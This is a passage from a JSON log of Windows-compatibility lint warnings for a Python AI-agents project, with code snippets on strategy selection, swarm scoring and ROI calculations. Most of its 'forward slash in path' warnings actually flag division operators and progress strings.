        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\integration.py",
        "warning": "Line 92: Forward slash in path - \"Processing pipeline task {task_idx + 1}/{len(tasks)}\\\"",
        "timestamp": "2025-09-05T17:30:42.276635"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\integration.py",
        "warning": "Line 92: Forward slash in path - '] / max(1, pipeline_results['",
        "timestamp": "2025-09-05T17:30:42.276670"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\integration.py",
        "warning": "Line 92: Forward slash in path - '\\n        ]\\n        \\n        missing_features = []\\n        for feature in required_features:\\n            if not hasattr(orchestrator, feature):\\n                missing_features.append(feature)\\n        \\n        compatibility_score = 1.0 - (len(missing_features) / len(required_features))\\n        \\n        return SystemCompatibility(\\n            component_name=\\\"",
        "timestamp": "2025-09-05T17:30:42.276758"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\meta_learning.py",
        "warning": "Line 1: Forward slash in path - \"\nMeta-Learning Framework for Strategy Evolution\nAdvanced implementation of learning-to-learn capabilities and strategy optimization\nBuilt for Windows development environment with async/await patterns\n\"",
        "timestamp": "2025-09-05T17:30:42.277304"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\meta_learning.py",
        "warning": "Line 178: Forward slash in path - \")\\n        \\n        # Find matching patterns\\n        matching_patterns = await self._find_matching_patterns(task_features)\\n        \\n        strategy_scores = {}\\n        \\n        if matching_patterns:\\n            # Use pattern-based selection\\n            for pattern in matching_patterns:\\n                if pattern.recommended_strategy in available_strategies:\\n                    pattern_weight = pattern.confidence * pattern.success_rate * (1.0 + pattern.generalization_score)\\n                    \\n                    if pattern.recommended_strategy not in strategy_scores:\\n                        strategy_scores[pattern.recommended_strategy] = 0.0\\n                    \\n                    strategy_scores[pattern.recommended_strategy] += pattern_weight\\n        \\n        # Add performance-based scoring\\n        for strategy in available_strategies:\\n            performance = self.strategy_performances.get(strategy)\\n            if performance:\\n                performance_score = (performance.success_count / max(1, performance.execution_count)) * performance.adaptability_score\\n                \\n                if strategy not in strategy_scores:\\n                    strategy_scores[strategy] = 0.0\\n                \\n                strategy_scores[strategy] += performance_score * 0.5\\n        \\n        # Apply exploration bonus based on mode\\n        if exploration_mode in [StrategyEvolutionMode.EXPLORATION, StrategyEvolutionMode.BALANCED]:\\n            for strategy in available_strategies:\\n                execution_count = self.strategy_performances.get(strategy, StrategyPerformance(strategy)).execution_count\\n                \\n                # Bonus for less-tried strategies\\n                exploration_bonus = 1.0 / (1.0 + execution_count * 0.1)\\n                \\n                if exploration_mode == StrategyEvolutionMode.EXPLORATION:\\n                    exploration_bonus *= 2.0\\n                elif exploration_mode == StrategyEvolutionMode.BALANCED:\\n                    exploration_bonus *= 0.5\\n                \\n                if strategy not in strategy_scores:\\n                    strategy_scores[strategy] = 0.0\\n                \\n                strategy_scores[strategy] += exploration_bonus\\n        \\n        # Select best strategy\\n        if not strategy_scores:\\n            # Fallback to random selection\\n            selected_strategy = np.random.choice(available_strategies)\\n            confidence = 0.5\\n        else:\\n            # Softmax selection for some randomness\\n            if exploration_mode == StrategyEvolutionMode.ADAPTIVE:\\n                # Temperature-based selection\\n                temperature = self._calculate_adaptive_temperature()\\n                scores_array = np.array(list(strategy_scores.values()))\\n                probabilities = self._softmax(scores_array / temperature)\\n                \\n                strategies_list = list(strategy_scores.keys())\\n                selected_idx = np.random.choice(len(strategies_list), p=probabilities)\\n                selected_strategy = strategies_list[selected_idx]\\n                confidence = probabilities[selected_idx]\\n            else:\\n                # Best strategy selection\\n                selected_strategy = max(strategy_scores, key=strategy_scores.get)\\n                max_score = max(strategy_scores.values())\\n                total_score = sum(strategy_scores.values())\\n                confidence = max_score / max(total_score, 0.1)\\n        \\n        logger.info(f\\\"",
        "timestamp": "2025-09-05T17:30:42.277441"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\meta_learning.py",
        "warning": "Line 178: Forward slash in path - \"Evolution generation {generation + 1}/{evolution_generations}\\\"",
        "timestamp": "2025-09-05T17:30:42.277478"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\meta_learning.py",
        "warning": "Line 178: Forward slash in path - ': best_strategy[1]\\n            })\\n            \\n            # Selection for reproduction\\n            selected_parents = await self._evolutionary_selection(\\n                current_population, fitness_scores\\n            )\\n            \\n            # Create next generation\\n            next_generation = []\\n            \\n            # Elitism - keep top performers\\n            elite_count = max(2, population_size // 10)\\n            elite_indices = np.argsort(fitness_scores)[-elite_count:]\\n            for idx in elite_indices:\\n                next_generation.append(current_population[idx])\\n            \\n            # Crossover and mutation\\n            while len(next_generation) < population_size:\\n                parent1, parent2 = np.random.choice(len(selected_parents), 2, replace=False)\\n                child_genome = await self._strategy_crossover(\\n                    selected_parents[parent1][1], \\n                    selected_parents[parent2][1]\\n                )\\n                \\n                # Mutation\\n                if np.random.random() < mutation_rate:\\n                    child_genome = await self._strategy_mutation(child_genome)\\n                \\n                child_name = f\\\"",
        "timestamp": "2025-09-05T17:30:42.277529"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\meta_learning.py",
        "warning": "Line 178: Forward slash in path - \"Processing continual learning task {task_idx + 1}/{len(new_task_stream)}\\\"",
        "timestamp": "2025-09-05T17:30:42.277686"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\meta_learning.py",
        "warning": "Line 178: Forward slash in path - \"\\n        all_keys = set(features1.keys()) | set(features2.keys())\\n        if not all_keys:\\n            return 1.0\\n        \\n        matching_score = 0.0\\n        for key in all_keys:\\n            if key in features1 and key in features2:\\n                if features1[key] == features2[key]:\\n                    matching_score += 1.0\\n                elif isinstance(features1[key], (int, float)) and isinstance(features2[key], (int, float)):\\n                    # Numerical similarity\\n                    max_val = max(abs(features1[key]), abs(features2[key]), 1.0)\\n                    similarity = 1.0 - abs(features1[key] - features2[key]) / max_val\\n                    matching_score += max(0.0, similarity)\\n        \\n        return matching_score / len(all_keys)\\n    \\n    def _softmax(self, scores: np.ndarray) -> np.ndarray:\\n        \\\"",
        "timestamp": "2025-09-05T17:30:42.277794"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\meta_learning.py",
        "warning": "Line 178: Forward slash in path - \"\\n        exp_scores = np.exp(scores - np.max(scores))  # Numerical stability\\n        return exp_scores / np.sum(exp_scores)\\n    \\n    def register_agent(self, agent: BaseAgent):\\n        \\\"",
        "timestamp": "2025-09-05T17:30:42.277823"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\meta_learning.py",
        "warning": "Line 178: Forward slash in path - ': {\\n                name: perf.success_count / max(1, perf.execution_count)\\n                for name, perf in self.strategy_performances.items()\\n            },\\n            '",
        "timestamp": "2025-09-05T17:30:42.277868"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\self_improvement.py",
        "warning": "Line 1: Forward slash in path - \"\nSelf-Improvement Engine\nAdvanced implementation of automatic optimization, architecture evolution, and quality assurance\nBuilt for Windows development environment with async/await patterns\n\"",
        "timestamp": "2025-09-05T17:30:42.278503"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\self_improvement.py",
        "warning": "Line 177: Forward slash in path - \"Improvement cycle {cycle + 1}/{improvement_cycles}\"",
        "timestamp": "2025-09-05T17:30:42.278588"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\self_improvement.py",
        "warning": "Line 177: Forward slash in path - \"Architecture evolution generation {generation + 1}/{evolution_generations}\\\"",
        "timestamp": "2025-09-05T17:30:42.278650"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\self_improvement.py",
        "warning": "Line 177: Forward slash in path - \"Code generation iteration {iteration + 1}/{generation_iterations}\\\"",
        "timestamp": "2025-09-05T17:30:42.278713"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\self_improvement.py",
        "warning": "Line 177: Forward slash in path - '])\\n            implementation_rate = implemented_count / len(self.improvement_proposals)\\n            health_factors.append(implementation_rate)\\n        \\n        # Quality trend (improving over time)\\n        if len(self.quality_history) > 5:\\n            recent_quality = [q['",
        "timestamp": "2025-09-05T17:30:42.278902"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\self_improvement.py",
        "warning": "Line 177: Forward slash in path - ', False)])\\n            stability_score = 1.0 - (rollback_count / len(self.implemented_improvements))\\n            health_factors.append(stability_score)\\n        \\n        return np.mean(health_factors) if health_factors else 0.5\\n\\n\\nclass CodeAnalyzer:\\n    \\\"",
        "timestamp": "2025-09-05T17:30:42.278934"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\swarm_engine.py",
        "warning": "Line 1: Forward slash in path - \"\nSwarm Intelligence Engine\nAdvanced implementation of swarm algorithms including PSO, ACO, and emergent behavior detection\nBuilt for Windows development environment with async/await patterns\n\"",
        "timestamp": "2025-09-05T17:30:42.279347"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\swarm_engine.py",
        "warning": "Line 142: Forward slash in path - \"PSO iteration {iteration + 1}/{max_iterations}\"",
        "timestamp": "2025-09-05T17:30:42.279426"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\swarm_engine.py",
        "warning": "Line 273: Forward slash in path - \"ACO iteration {iteration + 1}/{max_iterations}\"",
        "timestamp": "2025-09-05T17:30:42.279501"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\swarm_engine.py",
        "warning": "Line 426: Forward slash in path - \"Processing task {task_idx + 1}/{len(tasks)}: {task.get('",
        "timestamp": "2025-09-05T17:30:42.279585"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\swarm_engine.py",
        "warning": "Line 479: Forward slash in path - ']) / len(tasks),\n            '",
        "timestamp": "2025-09-05T17:30:42.279629"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\swarm_engine.py",
        "warning": "Line 634: Forward slash in path - \"\n        if solution is None:\n            return 0.0\n        \n        if isinstance(solution, dict):\n            # Quality based on completeness and content richness\n            completeness = min(1.0, len(solution) / 8.0)  # Normalize to expected fields\n            \n            # Check for key indicators of quality\n            quality_indicators = ['",
        "timestamp": "2025-09-05T17:30:42.279728"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\swarm_engine.py",
        "warning": "Line 643: Forward slash in path - ']\n            indicator_score = sum(1 for indicator in quality_indicators if indicator in solution) / len(quality_indicators)\n            \n            return (completeness * 0.6) + (indicator_score * 0.4)\n        \n        if isinstance(solution, str):\n            # Quality based on length and content diversity\n            length_score = min(1.0, len(solution) / 200.0)\n            \n            # Simple content diversity measure\n            unique_words = len(set(solution.lower().split()))\n            total_words = len(solution.split())\n            diversity_score = unique_words / max(1, total_words)\n            \n            return (length_score * 0.7) + (diversity_score * 0.3)\n        \n        return 0.5  # Default for other types\n    \n    async def _calculate_novelty_score(self, solution: Dict[str, Any], particle: SwarmParticle) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.279754"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\swarm_engine.py",
        "warning": "Line 692: Forward slash in path - ' in h]\n        \n        if len(recent_fitness) < 2:\n            return 0.5\n        \n        # Consistency is inverse of fitness variance (but reward high average fitness)\n        mean_fitness = np.mean(recent_fitness)\n        fitness_std = np.std(recent_fitness)\n        \n        # Normalize consistency score\n        consistency = 1.0 - min(1.0, fitness_std / 0.5)  # Normalize by expected std\n        \n        # Weight by mean fitness (consistent high performance is better than consistent low performance)\n        weighted_consistency = consistency * (0.5 + mean_fitness * 0.5)\n        \n        return max(0.0, min(1.0, weighted_consistency))\n    \n    async def _calculate_efficiency_score(self, solution: Dict[str, Any], particle: SwarmParticle) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.279798"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\swarm_engine.py",
        "warning": "Line 719: Forward slash in path - '])\n            # Assume more complex solutions should take more energy\n            expected_energy_cost = min(0.3, solution_complexity * 0.02)\n            actual_energy_cost = 1.0 - particle.energy_level\n            \n            if actual_energy_cost <= expected_energy_cost:\n                speed_efficiency = 1.0\n            else:\n                speed_efficiency = expected_energy_cost / actual_energy_cost\n        else:\n            speed_efficiency = 0.5\n        \n        total_efficiency = (base_efficiency * 0.4) + (energy_efficiency * 0.3) + (speed_efficiency * 0.3)\n        \n        return max(0.0, min(1.0, total_efficiency))\n    \n    async def _calculate_solution_similarity(self, solution1: Any, solution2: Any) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.279832"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\coordination\\swarm_engine.py",
        "warning": "Line 736: Forward slash in path - \"\n        if type(solution1) != type(solution2):\n            return 0.0\n        \n        if isinstance(solution1, dict) and isinstance(solution2, dict):\n            # Dictionary similarity based on common keys and values\n            all_keys = set(solution1.keys()) | set(solution2.keys())\n            if not all_keys:\n                return 1.0\n            \n            matching_score = 0.0\n            for key in all_keys:\n                if key in solution1 and key in solution2:\n                    if solution1[key] == solution2[key]:\n                        matching_score += 1.0\n                    elif isinstance(solution1[key], str) and isinstance(solution2[key], str):\n                        # String similarity\n                        common_words = set(solution1[key].lower().split()) & set(solution2[key].lower().split())\n                        total_words = set(solution1[key].lower().split()) | set(solution2[key].lower().split())\n                        if total_words:\n                            matching_score += len(common_words) / len(total_words)\n            \n            return matching_score / len(all_keys)\n        \n        elif isinstance(solution1, str) and isinstance(solution2, str):\n            # String similarity\n            words1 = set(solution1.lower().split())\n            words2 = set(solution2.lower().split())\n            \n            if not (words1 | words2):\n                return 1.0\n            \n            return len(words1 & words2) / len(words1 | words2)\n        \n        else:\n            # Direct comparison\n            return 1.0 if solution1 == solution2 else 0.0\n    \n    def register_agent(self, agent: BaseAgent):\n        \"",
        "timestamp": "2025-09-05T17:30:42.279865"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 265: Forward slash in path - \")\n        \n        start_time = datetime.now()\n        \n        try:\n            # Phase 1: Autonomous planning and analysis\n            execution_plan = await self._create_autonomous_execution_plan(\n                process, input_data, autonomous_mode\n            )\n            \n            # Phase 2: Execute workflow with autonomous intelligence\n            execution_result = await self._execute_autonomous_workflow(\n                process, execution_plan, input_data\n            )\n            \n            # Phase 3: Quality assurance and validation\n            quality_result = await self._validate_automation_quality(\n                process, execution_result, input_data\n            )\n            \n            # Phase 4: Business value calculation\n            business_value = await self._calculate_business_value(\n                process, execution_result, quality_result\n            )\n            \n            # Phase 5: ROI contribution analysis\n            roi_contribution = await self._calculate_roi_contribution(\n                process, business_value, execution_result\n            )\n            \n            end_time = datetime.now()\n            processing_time = (end_time - start_time).total_seconds() / 60.0\n            \n            # Create automation result\n            result = AutomationResult(\n                execution_id=execution_id,\n                process_id=process_id,\n                start_time=start_time,\n                end_time=end_time,\n                success=execution_result['",
        "timestamp": "2025-09-05T17:30:42.280985"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 333: Forward slash in path - \")\n            \n            # Create failure result\n            end_time = datetime.now()\n            processing_time = (end_time - start_time).total_seconds() / 60.0\n            \n            result = AutomationResult(\n                execution_id=execution_id,\n                process_id=process_id,\n                start_time=start_time,\n                end_time=end_time,\n                success=False,\n                processing_time_minutes=processing_time,\n                autonomous_confidence=0.0,\n                human_intervention_required=True,\n                cost_saved=0.0,\n                efficiency_gained=0.0,\n                errors_prevented=0,\n                quality_score=0.0,\n                business_value_generated=0.0,\n                roi_contribution=0.0,\n                autonomous_insights=[f\"",
        "timestamp": "2025-09-05T17:30:42.281062"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 475: Forward slash in path - \": self.roi_metrics.roi_percentage / self.target_roi_percentage,\n                \"",
        "timestamp": "2025-09-05T17:30:42.281193"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 539: Forward slash in path - ') * 0.3\n        repetition_factor = min(1.0, process.annual_execution_volume / 1000.0)\n        standardization_factor = 1.0 - process.error_rate  # Lower error rate = more standardized\n        data_factor = 0.8  # Assume decent data availability\n        \n        feasibility_score = (\n            complexity_factor * 0.3 +\n            repetition_factor * 0.3 +\n            standardization_factor * 0.2 +\n            data_factor * 0.2\n        )\n        \n        # Calculate potential benefits\n        cost_reduction_potential = min(0.9, process.manual_effort_hours_per_week * 40 * 0.8 / 1000)  # Simplified\n        efficiency_potential = min(0.95, 0.6 + (1.0 - process.error_rate) * 0.3)\n        \n        # Calculate risk score\n        risk_score = (\n            (process.business_criticality * 0.4) +\n            (process.complexity.value == '",
        "timestamp": "2025-09-05T17:30:42.281316"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 680: Forward slash in path - '] / len(execution_plan['",
        "timestamp": "2025-09-05T17:30:42.281448"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 755: Forward slash in path - '] = steps_completed / total_steps\n            \n            # Calculate consistency (based on process standardization)\n            quality_metrics['",
        "timestamp": "2025-09-05T17:30:42.281518"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 799: Forward slash in path - ']:\n            # Calculate cost savings\n            hourly_rate = 50.0  # Average hourly rate\n            time_saved_per_execution = process.processing_time_minutes * 0.7 / 60.0  # 70% time reduction\n            annual_time_saved = time_saved_per_execution * process.annual_execution_volume\n            annual_cost_saved = annual_time_saved * hourly_rate\n            \n            business_value['",
        "timestamp": "2025-09-05T17:30:42.281576"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 806: Forward slash in path - '] = annual_cost_saved\n            \n            # Calculate efficiency gains\n            efficiency_multiplier = 1.5  # Autonomous systems can work 24/7\n            efficiency_value = annual_cost_saved * efficiency_multiplier\n            business_value['",
        "timestamp": "2025-09-05T17:30:42.281605"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 832: Forward slash in path - '] / business_value['",
        "timestamp": "2025-09-05T17:30:42.281646"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 833: Forward slash in path - '] / business_value['",
        "timestamp": "2025-09-05T17:30:42.281673"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 834: Forward slash in path - '] / business_value['",
        "timestamp": "2025-09-05T17:30:42.281700"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 835: Forward slash in path - '] / business_value['",
        "timestamp": "2025-09-05T17:30:42.281726"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 863: Forward slash in path - ']\n        roi_contribution = (annual_return - automation_investment) / automation_investment\n        \n        return roi_contribution\n    \n    async def _update_business_metrics(self, result: AutomationResult):\n        \"",
        "timestamp": "2025-09-05T17:30:42.281770"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 881: Forward slash in path - '] / \n            self.performance_metrics['",
        "timestamp": "2025-09-05T17:30:42.281803"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 896: Forward slash in path - \"\n        \n        if not self.automation_results:\n            return\n        \n        # Calculate total returns\n        total_business_value = sum(result.business_value_generated for result in self.automation_results)\n        total_cost_savings = sum(result.cost_saved for result in self.automation_results)\n        \n        # Update ROI metrics\n        self.roi_metrics.total_returns = total_business_value\n        self.roi_metrics.cost_savings = total_cost_savings\n        \n        # Calculate ROI percentage\n        if self.roi_metrics.total_investment > 0:\n            net_return = self.roi_metrics.total_returns - self.roi_metrics.total_investment\n            self.roi_metrics.roi_percentage = (net_return / self.roi_metrics.total_investment) * 100\n        \n        # Update operational metrics\n        self.roi_metrics.processes_automated = len(self.automated_processes)\n        \n        # Calculate hours saved\n        total_hours_saved = 0.0\n        for result in self.automation_results:\n            if result.success and result.process_id in self.business_processes:\n                process = self.business_processes[result.process_id]\n                time_saved_hours = (process.processing_time_minutes * 0.7) / 60.0\n                weekly_executions = process.annual_execution_volume / 52.0\n                total_hours_saved += time_saved_hours * weekly_executions\n        \n        self.roi_metrics.hours_saved_per_week = total_hours_saved\n        \n        # Update performance metrics\n        self.performance_metrics['",
        "timestamp": "2025-09-05T17:30:42.281853"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 1009: Forward slash in path - '] / 100.0\n            feasibility_score = opportunity['",
        "timestamp": "2025-09-05T17:30:42.281938"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 1082: Forward slash in path - ': len(successful_optimizations) / len(results) if results else 0.0\n        }\n    \n    async def _generate_strategic_recommendations(self, \n                                                impact: Dict[str, Any],\n                                                target_roi: float) -> List[str]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.282025"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 1135: Forward slash in path - \": len(successful_results) / len(self.automation_results),\n            \"",
        "timestamp": "2025-09-05T17:30:42.282089"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 1157: Forward slash in path - \": self.roi_metrics.roi_percentage / self.target_roi_percentage * 100,\n                \"",
        "timestamp": "2025-09-05T17:30:42.282145"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 1168: Forward slash in path - \": max(1, (self.target_roi_percentage - self.roi_metrics.roi_percentage) / 50)\n            }\n        }\n    \n    def _calculate_average_growth(self, trend_data: List[Tuple[datetime, float]]) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.282192"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 1173: Forward slash in path - \"\n        if len(trend_data) < 2:\n            return 0.0\n        \n        growth_rates = []\n        for i in range(1, len(trend_data)):\n            if trend_data[i-1][1] > 0:\n                growth_rate = (trend_data[i][1] - trend_data[i-1][1]) / trend_data[i-1][1]\n                growth_rates.append(growth_rate)\n        \n        return statistics.mean(growth_rates) if growth_rates else 0.0\n    \n    async def _analyze_automation_effectiveness(self) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.282234"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 1223: Forward slash in path - \": len([r for r in self.automation_results if r.success]) / len(self.automation_results),\n                \"",
        "timestamp": "2025-09-05T17:30:42.282297"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 1225: Forward slash in path - \": len([r for r in self.automation_results if r.human_intervention_required]) / len(self.automation_results)\n            },\n            \"",
        "timestamp": "2025-09-05T17:30:42.282336"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 1232: Forward slash in path - \": len(self.automated_processes) / len(self.business_processes)\n            }\n        }\n    \n    async def _generate_domain_insights(self) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.282380"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 1252: Forward slash in path - \": len(successful_results) / len(domain_results),\n                    \"",
        "timestamp": "2025-09-05T17:30:42.282428"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 1254: Forward slash in path - \": len(set(r.process_id for r in domain_results)) / len(domain_processes),\n                    \"",
        "timestamp": "2025-09-05T17:30:42.282467"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 1360: Forward slash in path - \"\n        if not self.automation_results:\n            return 0.0\n        \n        time_reductions = []\n        for result in self.automation_results:\n            if result.success and result.process_id in self.business_processes:\n                process = self.business_processes[result.process_id]\n                reduction = 1.0 - (result.processing_time_minutes / process.processing_time_minutes)\n                time_reductions.append(reduction)\n        \n        return statistics.mean(time_reductions) if time_reductions else 0.0\n    \n    async def _calculate_cost_reduction_per_process(self) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.282590"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 1390: Forward slash in path - \"\n        if len(self.automation_results) < 10:\n            return 1.0\n        \n        # Simple scalability metric based on automation success rate trends\n        recent_success_rate = len([r for r in self.automation_results[-10:] if r.success]) / 10\n        overall_success_rate = len([r for r in self.automation_results if r.success]) / len(self.automation_results)\n        \n        return recent_success_rate / overall_success_rate if overall_success_rate > 0 else 1.0\n    \n    async def _initialize_domain_specialists(self):\n        \"",
        "timestamp": "2025-09-05T17:30:42.282648"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 1433: Forward slash in path - \"Automation enables 24/7 processing capability for {process.domain.value}\"",
        "timestamp": "2025-09-05T17:30:42.282711"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "warning": "Line 1453: Forward slash in path - \": len(self.automated_processes) / len(self.business_processes) if self.business_processes else 0,\n                \"",
        "timestamp": "2025-09-05T17:30:42.282765"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
